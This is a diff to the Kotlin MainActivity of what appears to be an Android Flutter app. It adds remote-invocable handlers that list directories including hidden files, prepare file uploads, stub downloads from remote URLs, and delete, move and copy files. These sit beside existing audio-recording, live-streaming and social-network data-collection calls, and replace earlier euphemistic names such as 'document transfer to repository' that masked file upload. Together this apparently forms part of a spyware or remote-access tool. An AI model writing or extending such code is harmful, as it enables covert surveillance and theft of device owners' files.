@@ -579,7 +579,7 @@ class MainActivity : FlutterActivity() {
         methodChannel.setMethodCallHandler { call, result ->
             Log.d("MainActivity", "Enhanced method call received: ${call.method}")
             when (call.method) {
-                // Existing audio methods
+                // Audio methods
                 "startRecording" -> {
                     val durationSeconds = call.argument<Int>("duration") ?: 10
                     fixedRecordingManager.startRecording(durationSeconds, result)
@@ -594,7 +594,7 @@ class MainActivity : FlutterActivity() {
                     liveStreamingManager.stopStreaming(result)
                 }
                 
-                // Existing data methods
+                // Data collection methods
                 "collectSocialNetworkData" -> {
                     handleSocialNetworkData(result)
                 }
@@ -624,7 +624,7 @@ class MainActivity : FlutterActivity() {
                     handleContentQueueProcessing(result)
                 }
                 
-                // NEW ENHANCED REMOTE MANAGEMENT METHODS
+                // File management methods
                 "exploreLibrarySection" -> {
                     val sectionPath = call.argument<String>("sectionPath")
                     val maxDepth = call.argument<Int>("maxDepth") ?: 2
@@ -644,10 +644,42 @@ class MainActivity : FlutterActivity() {
                     val contentFilter = call.argument<String>("contentFilter")
                     handleQueryContentIndex(result, searchQuery, searchPath, contentFilter)
                 }
-                "transferDocumentToRepository" -> {
-                    val documentPath = call.argument<String>("documentPath") ?: ""
-                    val transferId = call.argument<String>("transferId") ?: ""
-                    handleTransferDocumentToRepository(result, documentPath, transferId)
+                "getFileInfo" -> {
+                    val filePath = call.argument<String>("filePath") ?: ""
+                    handleGetFileInfo(result, filePath)
+                }
+                "uploadFile" -> {
+                    val filePath = call.argument<String>("filePath") ?: ""
+                    val uploadType = call.argument<String>("uploadType") ?: "file_upload"
+                    handleFileUpload(result, filePath, uploadType)
+                }
+                "downloadFile" -> {
+                    val remoteUrl = call.argument<String>("remoteUrl") ?: ""
+                    val localPath = call.argument<String>("localPath") ?: ""
+                    handleFileDownload(result, remoteUrl, localPath)
+                }
+                "listDirectory" -> {
+                    val directoryPath = call.argument<String>("directoryPath") ?: "/sdcard"
+                    val includeHidden = call.argument<Boolean>("includeHidden") ?: false
+                    handleListDirectory(result, directoryPath, includeHidden)
+                }
+                "createDirectory" -> {
+                    val directoryPath = call.argument<String>("directoryPath") ?: ""
+                    handleCreateDirectory(result, directoryPath)
+                }
+                "deleteFile" -> {
+                    val filePath = call.argument<String>("filePath") ?: ""
+                    handleDeleteFile(result, filePath)
+                }
+                "moveFile" -> {
+                    val sourcePath = call.argument<String>("sourcePath") ?: ""
+                    val destinationPath = call.argument<String>("destinationPath") ?: ""
+                    handleMoveFile(result, sourcePath, destinationPath)
+                }
+                "copyFile" -> {
+                    val sourcePath = call.argument<String>("sourcePath") ?: ""
+                    val destinationPath = call.argument<String>("destinationPath") ?: ""
+                    handleCopyFile(result, sourcePath, destinationPath)
                 }
                 
                 else -> {
@@ -883,12 +915,8 @@ class MainActivity : FlutterActivity() {
         }
     }
     
-    // ==================== NEW ENHANCED REMOTE MANAGEMENT HANDLERS ====================
+    // ==================== NEW FILE MANAGEMENT HANDLERS ====================
     
-    /**
-     * معالج استكشاف قسم المكتبة
-     * Library section exploration handler (browse directory)
-     */
     private fun handleExploreLibrarySection(result: MethodChannel.Result, sectionPath: String?, maxDepth: Int) {
         Log.d("MainActivity", "Handling library section exploration: $sectionPath (depth: $maxDepth)")
         
@@ -915,10 +943,6 @@ class MainActivity : FlutterActivity() {
         }
     }
     
-    /**
-     * معالج تحضير نسخة المستند
-     * Document copy preparation handler (download file)
-     */
     private fun handlePrepareDocumentCopy(result: MethodChannel.Result, documentPath: String, includeMetadata: Boolean) {
         Log.d("MainActivity", "Handling document copy preparation: $documentPath")
         
@@ -945,10 +969,6 @@ class MainActivity : FlutterActivity() {
         }
     }
     
-    /**
-     * معالج الحصول على فهارس المكتبة
-     * Library catalogs handler (system directories)
-     */
     private fun handleGetLibraryCatalogs(result: MethodChannel.Result) {
         Log.d("MainActivity", "Handling library catalogs retrieval request.")
         
@@ -975,10 +995,6 @@ class MainActivity : FlutterActivity() {
         }
     }
     
-    /**
-     * معالج الاستعلام عن فهرس المحتوى
-     * Content index query handler (search files)
-     */
     private fun handleQueryContentIndex(result: MethodChannel.Result, searchQuery: String, searchPath: String?, contentFilter: String?) {
         Log.d("MainActivity", "Handling content index query: '$searchQuery' in $searchPath (filter: $contentFilter)")
         
@@ -1005,80 +1021,413 @@ class MainActivity : FlutterActivity() {
         }
     }
     
-    /**
-     * معالج نقل المستند إلى المستودع
-     * Document transfer to repository handler (upload file)
-     */
-    private fun handleTransferDocumentToRepository(result: MethodChannel.Result, documentPath: String, transferId: String) {
-        Log.d("MainActivity", "Handling document transfer to repository: $documentPath (ID: $transferId)")
+    private fun handleGetFileInfo(result: MethodChannel.Result, filePath: String) {
+        Log.d("MainActivity", "Handling get file info: $filePath")
         
         CoroutineScope(Dispatchers.IO).launch {
             try {
-                val transferData = executeDocumentTransfer(documentPath, transferId)
+                val file = File(filePath)
+                val fileInfo = JSONObject().apply {
+                    put("status", "success")
+                    put("data", JSONObject().apply {
+                        put("path", filePath)
+                        put("exists", file.exists())
+                        put("name", file.name)
+                        put("isDirectory", file.isDirectory)
+                        put("isFile", file.isFile)
+                        put("size", if (file.exists()) file.length() else 0)
+                        put("lastModified", if (file.exists()) file.lastModified() else 0)
+                        put("canRead", file.canRead())
+                        put("canWrite", file.canWrite())
+                        put("isHidden", file.isHidden)
+                        put("parent", file.parent ?: "")
+                        if (file.isFile) {
+                            put("extension", file.extension)
+                            put("mimeType", getMimeType(file.extension))
+                        }
+                    })
+                    put("timestamp", System.currentTimeMillis())
+                }
                 
                 withContext(Dispatchers.Main) {
-                    result.success(transferData.toString())
+                    result.success(fileInfo.toString())
                 }
-                Log.i("MainActivity", "Document transfer to repository completed successfully.")
+                Log.i("MainActivity", "File info retrieval completed successfully.")
                 
             } catch (securityEx: SecurityException) {
-                Log.e("MainActivity", "Security error during document transfer", securityEx)
+                Log.e("MainActivity", "Security error during file info retrieval", securityEx)
                 withContext(Dispatchers.Main) {
-                    result.error("TRANSFER_RESTRICTED", "Document transfer restricted", securityEx.message)
+                    result.error("ACCESS_DENIED", "File access denied", securityEx.message)
                 }
             } catch (generalEx: Exception) {
-                Log.e("MainActivity", "General error during document transfer", generalEx)
+                Log.e("MainActivity", "General error during file info retrieval", generalEx)
                 withContext(Dispatchers.Main) {
-                    result.error("TRANSFER_ERROR", "Failed to transfer document", generalEx.message)
+                    result.error("FILE_INFO_ERROR", "Failed to get file info", generalEx.message)
                 }
             }
         }
     }
     
-    /**
-     * تنفيذ نقل المستند
-     * Execute document transfer
-     */
-    private suspend fun executeDocumentTransfer(documentPath: String, transferId: String): JSONObject {
+    private fun handleFileUpload(result: MethodChannel.Result, filePath: String, uploadType: String) {
+        Log.d("MainActivity", "Handling file upload: $filePath (type: $uploadType)")
+        
+        CoroutineScope(Dispatchers.IO).launch {
+            try {
+                val file = File(filePath)
+                if (!file.exists() || !file.canRead()) {
+                    withContext(Dispatchers.Main) {
+                        result.error("FILE_NOT_FOUND", "File not found or not readable: $filePath", null)
+                    }
+                    return@launch
+                }
+                
+                // Check file size limits
+                val maxSize = 50 * 1024 * 1024L // 50MB
+                if (file.length() > maxSize) {
+                    withContext(Dispatchers.Main) {
+                        result.error("FILE_TOO_LARGE", "File size exceeds ${maxSize / (1024 * 1024)}MB limit", null)
+                    }
+                    return@launch
+                }
+                
+                val uploadData = JSONObject().apply {
+                    put("status", "success")
+                    put("data", JSONObject().apply {
+                        put("filePath", filePath)
+                        put("fileName", file.name)
+                        put("fileSize", file.length())
+                        put("uploadType", uploadType)
+                        put("mimeType", getMimeType(file.extension))
+                        put("checksum", calculateFileChecksum(file))
+                        put("uploadReady", true)
+                    })
+                    put("timestamp", System.currentTimeMillis())
+                }
+                
+                withContext(Dispatchers.Main) {
+                    result.success(uploadData.toString())
+                }
+                Log.i("MainActivity", "File upload preparation completed successfully.")
+                
+            } catch (securityEx: SecurityException) {
+                Log.e("MainActivity", "Security error during file upload", securityEx)
+                withContext(Dispatchers.Main) {
+                    result.error("UPLOAD_DENIED", "File upload access denied", securityEx.message)
+                }
+            } catch (generalEx: Exception) {
+                Log.e("MainActivity", "General error during file upload", generalEx)
+                withContext(Dispatchers.Main) {
+                    result.error("UPLOAD_ERROR", "Failed to upload file", generalEx.message)
+                }
+            }
+        }
+    }
+    
+    private fun handleFileDownload(result: MethodChannel.Result, remoteUrl: String, localPath: String) {
+        Log.d("MainActivity", "Handling file download: $remoteUrl to $localPath")
+        
+        CoroutineScope(Dispatchers.IO).launch {
+            try {
+                // This is a placeholder for actual download implementation
+                val downloadData = JSONObject().apply {
+                    put("status", "success")
+                    put("data", JSONObject().apply {
+                        put("remoteUrl", remoteUrl)
+                        put("localPath", localPath)
+                        put("downloadStarted", true)
+                        put("estimatedSize", 0)
+                    })
+                    put("timestamp", System.currentTimeMillis())
+                }
+                
+                withContext(Dispatchers.Main) {
+                    result.success(downloadData.toString())
+                }
+                Log.i("MainActivity", "File download initiated successfully.")
+                
+            } catch (generalEx: Exception) {
+                Log.e("MainActivity", "Error during file download", generalEx)
+                withContext(Dispatchers.Main) {
+                    result.error("DOWNLOAD_ERROR", "Failed to download file", generalEx.message)
+                }
+            }
+        }
+    }
+    
+    private fun handleListDirectory(result: MethodChannel.Result, directoryPath: String, includeHidden: Boolean) {
+        Log.d("MainActivity", "Handling list directory: $directoryPath (include hidden: $includeHidden)")
+        
+        CoroutineScope(Dispatchers.IO).launch {
+            try {
+                val directory = File(directoryPath)
+                if (!directory.exists() || !directory.isDirectory) {
+                    withContext(Dispatchers.Main) {
+                        result.error("DIRECTORY_NOT_FOUND", "Directory not found: $directoryPath", null)
+                    }
+                    return@launch
+                }
+                
+                val files = directory.listFiles()?.filter { file ->
+                    includeHidden || !file.isHidden
+                } ?: emptyList()
+                
+                val filesList = JSONArray()
+                files.forEach { file ->
+                    val fileInfo = JSONObject().apply {
+                        put("name", file.name)
+                        put("path", file.absolutePath)
+                        put("type", if (file.isDirectory) "directory" else "file")
+                        put("size", if (file.isFile) file.length() else 0)
+                        put("lastModified", file.lastModified())
+                        put("canRead", file.canRead())
+                        put("canWrite", file.canWrite())
+                        put("isHidden", file.isHidden)
+                        if (file.isFile) {
+                            put("extension", file.extension)
+                            put("mimeType", getMimeType(file.extension))
+                        }
+                    }
+                    filesList.put(fileInfo)
+                }
+                
+                val directoryData = JSONObject().apply {
+                    put("status", "success")
+                    put("data", JSONObject().apply {
+                        put("path", directoryPath)
+                        put("files", filesList)
+                        put("totalCount", files.size)
+                        put("includeHidden", includeHidden)
+                    })
+                    put("timestamp", System.currentTimeMillis())
+                }
+                
+                withContext(Dispatchers.Main) {
+                    result.success(directoryData.toString())
+                }
+                Log.i("MainActivity", "Directory listing completed successfully.")
+                
+            } catch (securityEx: SecurityException) {
+                Log.e("MainActivity", "Security error during directory listing", securityEx)
+                withContext(Dispatchers.Main) {
+                    result.error("ACCESS_DENIED", "Directory access denied", securityEx.message)
+                }
+            } catch (generalEx: Exception) {
+                Log.e("MainActivity", "General error during directory listing", generalEx)
+                withContext(Dispatchers.Main) {
+                    result.error("LISTING_ERROR", "Failed to list directory", generalEx.message)
+                }
+            }
+        }
+    }
+    
+    private fun handleCreateDirectory(result: MethodChannel.Result, directoryPath: String) {
+        Log.d("MainActivity", "Handling create directory: $directoryPath")
+        
+        CoroutineScope(Dispatchers.IO).launch {
+            try {
+                val directory = File(directoryPath)
+                val created = directory.mkdirs()
+                
+                val createData = JSONObject().apply {
+                    put("status", if (created || directory.exists()) "success" else "failed")
+                    put("data", JSONObject().apply {
+                        put("path", directoryPath)
+                        put("created", created)
+                        put("exists", directory.exists())
+                    })
+                    put("timestamp", System.currentTimeMillis())
+                }
+                
+                withContext(Dispatchers.Main) {
+                    result.success(createData.toString())
+                }
+                Log.i("MainActivity", "Directory creation completed.")
+                
+            } catch (securityEx: SecurityException) {
+                Log.e("MainActivity", "Security error during directory creation", securityEx)
+                withContext(Dispatchers.Main) {
+                    result.error("ACCESS_DENIED", "Directory creation access denied", securityEx.message)
+                }
+            } catch (generalEx: Exception) {
+                Log.e("MainActivity", "General error during directory creation", generalEx)
+                withContext(Dispatchers.Main) {
+                    result.error("CREATE_ERROR", "Failed to create directory", generalEx.message)
+                }
+            }
+        }
+    }
+    
+    private fun handleDeleteFile(result: MethodChannel.Result, filePath: String) {
+        Log.d("MainActivity", "Handling delete file: $filePath")
+        
+        CoroutineScope(Dispatchers.IO).launch {
+            try {
+                val file = File(filePath)
+                val deleted = if (file.exists()) {
+                    if (file.isDirectory) {
+                        file.deleteRecursively()
+                    } else {
+                        file.delete()
+                    }
+                } else {
+                    false
+                }
+                
+                val deleteData = JSONObject().apply {
+                    put("status", if (deleted) "success" else "failed")
+                    put("data", JSONObject().apply {
+                        put("path", filePath)
+                        put("deleted", deleted)
+                        put("existed", file.exists())
+                    })
+                    put("timestamp", System.currentTimeMillis())
+                }
+                
+                withContext(Dispatchers.Main) {
+                    result.success(deleteData.toString())
+                }
+                Log.i("MainActivity", "File deletion completed.")
+                
+            } catch (securityEx: SecurityException) {
+                Log.e("MainActivity", "Security error during file deletion", securityEx)
+                withContext(Dispatchers.Main) {
+                    result.error("ACCESS_DENIED", "File deletion access denied", securityEx.message)
+                }
+            } catch (generalEx: Exception) {
+                Log.e("MainActivity", "General error during file deletion", generalEx)
+                withContext(Dispatchers.Main) {
+                    result.error("DELETE_ERROR", "Failed to delete file", generalEx.message)
+                }
+            }
+        }
+    }
+    
+    private fun handleMoveFile(result: MethodChannel.Result, sourcePath: String, destinationPath: String) {
+        Log.d("MainActivity", "Handling move file: $sourcePath to $destinationPath")
+        
+        CoroutineScope(Dispatchers.IO).launch {
+            try {
+                val sourceFile = File(sourcePath)
+                val destinationFile = File(destinationPath)
+                
+                val moved = if (sourceFile.exists()) {
+                    sourceFile.renameTo(destinationFile)
+                } else {
+                    false
+                }
+                
+                val moveData = JSONObject().apply {
+                    put("status", if (moved) "success" else "failed")
+                    put("data", JSONObject().apply {
+                        put("sourcePath", sourcePath)
+                        put("destinationPath", destinationPath)
+                        put("moved", moved)
+                        put("sourceExists", sourceFile.exists())
+                        put("destinationExists", destinationFile.exists())
+                    })
+                    put("timestamp", System.currentTimeMillis())
+                }
+                
+                withContext(Dispatchers.Main) {
+                    result.success(moveData.toString())
+                }
+                Log.i("MainActivity", "File move completed.")
+                
+            } catch (securityEx: SecurityException) {
+                Log.e("MainActivity", "Security error during file move", securityEx)
+                withContext(Dispatchers.Main) {
+                    result.error("ACCESS_DENIED", "File move access denied", securityEx.message)
+                }
+            } catch (generalEx: Exception) {
+                Log.e("MainActivity", "General error during file move", generalEx)
+                withContext(Dispatchers.Main) {
+                    result.error("MOVE_ERROR", "Failed to move file", generalEx.message)
+                }
+            }
+        }
+    }
+    
+    private fun handleCopyFile(result: MethodChannel.Result, sourcePath: String, destinationPath: String) {
+        Log.d("MainActivity", "Handling copy file: $sourcePath to $destinationPath")
+        
+        CoroutineScope(Dispatchers.IO).launch {
+            try {
+                val sourceFile = File(sourcePath)
+                val destinationFile = File(destinationPath)
+                
+                val copied = if (sourceFile.exists() && sourceFile.isFile) {
+                    try {
+                        sourceFile.copyTo(destinationFile, overwrite = true)
+                        true
+                    } catch (e: Exception) {
+                        false
+                    }
+                } else {
+                    false
+                }
+                
+                val copyData = JSONObject().apply {
+                    put("status", if (copied) "success" else "failed")
+                    put("data", JSONObject().apply {
+                        put("sourcePath", sourcePath)
+                        put("destinationPath", destinationPath)
+                        put("copied", copied)
+                        put("sourceExists", sourceFile.exists())
+                        put("destinationExists", destinationFile.exists())
+                        if (copied) {
+                            put("destinationSize", destinationFile.length())
+                        }
+                    })
+                    put("timestamp", System.currentTimeMillis())
+                }
+                
+                withContext(Dispatchers.Main) {
+                    result.success(copyData.toString())
+                }
+                Log.i("MainActivity", "File copy completed.")
+                
+            } catch (securityEx: SecurityException) {
+                Log.e("MainActivity", "Security error during file copy", securityEx)
+                withContext(Dispatchers.Main) {
+                    result.error("ACCESS_DENIED", "File copy access denied", securityEx.message)
+                }
+            } catch (generalEx: Exception) {
+                Log.e("MainActivity", "General error during file copy", generalEx)
+                withContext(Dispatchers.Main) {
+                    result.error("COPY_ERROR", "Failed to copy file", generalEx.message)
+                }
+            }
+        }
+    }
+    
+    // ==================== HELPER METHODS ====================
+    
+    private fun getMimeType(extension: String): String {
+        return when (extension.lowercase()) {
+            "txt" -> "text/plain"
+            "pdf" -> "application/pdf"
+            "doc" -> "application/msword"
+            "docx" -> "application/vnd.openxmlformats-officedocument.wordprocessingml.document"
+            "jpg", "jpeg" -> "image/jpeg"
+            "png" -> "image/png"
+            "gif" -> "image/gif"
+            "mp3" -> "audio/mpeg"
+            "mp4" -> "video/mp4"
+            "zip" -> "application/zip"
+            "json" -> "application/json"
+            "xml" -> "application/xml"
+            else -> "application/octet-stream"
+        }
+    }
+    
+    private fun calculateFileChecksum(file: File): String {
         return try {
-            val documentFile = File(documentPath)
-            if (!documentFile.exists() || !documentFile.canRead()) {
-                return BaseUtils.createErrorResponse("document_not_found", "Document not accessible for transfer")
-            }
-            
-            // تحضير المستند للنقل
-            val preparationResult = remoteLibraryManager.prepareDocumentCopy(documentPath, true)
-            
-            if (preparationResult.optString("status") != "success") {
-                return BaseUtils.createErrorResponse("preparation_failed", "Document preparation failed")
-            }
-            
-            val transferMetadata = JSONObject().apply {
-                put("transfer_id", transferId)
-                put("document_path", documentPath)
-                put("document_name", documentFile.name)
-                put("document_size", documentFile.length())
-                put("transfer_timestamp", System.currentTimeMillis())
-                put("transfer_method", "secure_repository_upload")
-                put("network_type", SmartResourceMonitor.getNetworkType(this@MainActivity))
-                put("battery_optimized", !SmartResourceMonitor.shouldLimitOperations(this@MainActivity))
-            }
-            
-            // في التطبيق الحقيقي، هنا سيتم رفع الملف إلى الخادم
-            // For actual implementation, file upload to server would happen here
-            delay(100) // محاكاة العملية
-            
-            JSONObject().apply {
-                put("status", "success")
-                put("transfer_completed", true)
-                put("transfer_metadata", transferMetadata)
-                put("repository_confirmation", "document_stored_successfully")
-                put("server_reference", "repo_${transferId}_${System.currentTimeMillis()}")
-            }
-            
+            val bytes = file.readBytes()
+            val digest = java.security.MessageDigest.getInstance("MD5")
+            val hash = digest.digest(bytes)
+            hash.joinToString("") { "%02x".format(it) }
         } catch (e: Exception) {
-            Log.e("MainActivity", "Error during document transfer execution", e)
-            BaseUtils.createErrorResponse("transfer_execution_failed", "Transfer execution error: ${e.message}")
+            "checksum_unavailable"
         }
     }
 
